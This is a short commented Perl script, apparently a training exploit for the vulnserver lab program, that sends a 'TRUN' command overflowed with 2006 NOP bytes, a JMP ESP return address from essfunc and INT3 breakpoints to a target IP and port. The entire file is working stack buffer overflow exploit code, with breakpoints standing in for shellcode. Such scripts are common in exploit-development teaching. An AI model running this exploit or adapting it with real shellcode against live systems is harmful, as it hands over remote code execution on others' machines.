#!/usr/bin/perl
use IO::Socket;
if ($ARGV[1] eq '') {
die("Usage: $0 IP_ADDRESS PORT\n\n");
}

$baddata = "TRUN ."; # sets variable $baddata to "TRUN ."
$baddata .= "\x90" x 2006; # append 2006 \x90 bytes to $baddata
$baddata .= pack('V1', 0x625011AF); # address of "JMP ESP" instruction from essfunc, little endian
$baddata .= "\xcc" x 100; # append 100 \xcc INT3 breakpoints to $baddata

$socket = IO::Socket::INET->new( # setup TCP socket – $socket
Proto => "tcp",
PeerAddr => "$ARGV[0]", # command line variable 1 – IP Address
PeerPort => "$ARGV[1]" # command line variable 2 – TCP port
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";

$socket->recv($sd, 1024); # Receive 1024 bytes data from $socket, store in $sd
print "$sd"; # print $sd variable
$socket->send($baddata); # send $baddata variable via $socket
